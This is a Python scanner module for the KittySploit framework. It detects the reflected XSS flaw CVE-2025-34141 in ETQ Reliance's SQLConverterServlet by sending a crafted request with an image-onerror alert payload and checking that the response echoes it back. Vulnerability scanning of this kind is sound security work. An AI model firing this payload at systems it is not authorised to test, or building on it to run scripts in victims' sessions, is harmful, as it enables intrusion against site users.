#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A reflected cross-site scripting (XSS) vulnerability exists in ETQ Reliance CG (legacy) platform within the SQ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ETQ Reliance - Reflected XSS via SQLConverterServlet Detection',
        'description': "A reflected cross-site scripting (XSS) vulnerability exists in ETQ Reliance CG (legacy) platform within the SQLConverterServlet component. This vulnerability requires user interaction, such as clicking a crafted link, and may result in execution of unauthorized scripts in the user's context. The affected servlet was unnecessarily exposed to authenticated users and has since been disabled in version SE.2025.1.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'etq', 'reliance', 'xss', 'reflected-xss', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-34141',
            'https://slcyber.io/assetnote-security-research-center/how-we-accidentally-discovered-a-remote-code-execution-vulnerability-in-etq-reliance/',
        ],
        'cve': 'CVE-2025-34141',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/reliance/SQLConverterServlet?MySQLStm=%3C/textarea%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('</textarea><img src=x onerror=alert(document.domain)>', 'You have to start the ENGINE application before using this form.',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='ETQ Reliance - Reflected XSS via SQLConverterServlet detected', path=path)
            return True
        return False

